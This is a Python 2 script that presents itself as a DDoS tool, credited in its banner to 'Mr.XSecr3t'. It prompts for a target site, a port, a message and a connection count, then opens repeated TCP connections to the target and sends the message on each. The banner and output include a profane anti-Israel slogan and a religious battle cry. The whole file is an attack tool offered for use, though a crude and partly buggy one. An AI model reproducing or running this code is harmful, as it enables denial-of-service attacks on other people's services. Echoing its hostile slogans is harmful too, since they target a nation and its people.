 
import time
import socket
import os
import sys
import string
print ("++++++++++++++++++++++++++++++++++++++")
print ("|       __  _______ ____       _____ |")
print ("|       | |/ / ___// __ \____ / ___/ |")
print ("|       |   /\__ \/ / / / __ \\__ \  |")
print ("|      /   |___/ / /_/ / /_/ /__/ /  |")
print ("|     /_/|_/____/_____/\____/____/   |")
print ("|                                    |")
print ("|          Cod3d By Mr.XSecr3t       |")
print ("|         Written By Python Cod3     |")
print ("| Contact : anonxsecr3t@tutamail.com |")
print ("|                                    |")
print ("|          /!\ Fuck Israel/!\        |")
print ("++++++++++++++++++++++++++++++++++++++")
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
print ("DDoS mode loaded                     +")
print ("powerful DDoS Made By Mr.XSecr3t     +")
print ("Use At Your Own Risk                 +")
print ("++++++++++++++++++++++++++++++++++++++")
host=raw_input( "Site you want to DDoS:" )
port=input( "Port you want to attack:" )
message=raw_input( "Message Do You Want Send : ")
conn=input("How Many Connection You Want Make : ")
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[Ip is locked]" )
print ( "[Attacking " + host + "]" )
print ("+----------------------------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, 
socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("|[Connection Failed]         |")
    print ( "|[Allahu Akbar!!]       |")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("The connections you requested had finished")
if __name__ == "__main__":
    answer = raw_input("Want DDoS Again?")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
